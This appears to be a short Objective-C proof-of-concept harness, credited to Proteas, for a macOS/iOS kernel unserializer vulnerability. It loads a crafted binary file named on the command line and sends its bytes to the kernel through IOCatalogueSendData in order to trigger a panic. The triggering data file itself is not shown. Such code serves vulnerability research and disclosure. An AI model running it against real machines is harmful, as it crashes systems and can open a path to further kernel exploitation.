//
//  unserializer-vul-poc.m
//  PoC
//
//  Created by Proteas on 16/8/25.
//  Copyright © 2016年 Proteas. All rights reserved.
//

#include <Foundation/Foundation.h>
#include <IOKit/IOKitLib.h>

int main(int argc, const char * argv[])
{
    @autoreleasepool {
        if (argc != 2) {
            printf("Usage: ./poc ./data/panic-1.bin\n");
            exit(1);
        }
        
        NSString *filePath = [NSString stringWithUTF8String:argv[1]];
        NSData *propertyBinData = [NSData dataWithContentsOfFile:filePath];
        if (!propertyBinData) {
            printf("[-] fail to load file: %s\n", [filePath UTF8String]);
            exit(1);
        }
        
        IOCatalogueSendData(kIOMasterPortDefault,
                            1,
                            [propertyBinData bytes],
                            (uint32_t)[propertyBinData length]);
    }
    
    return 0;
}
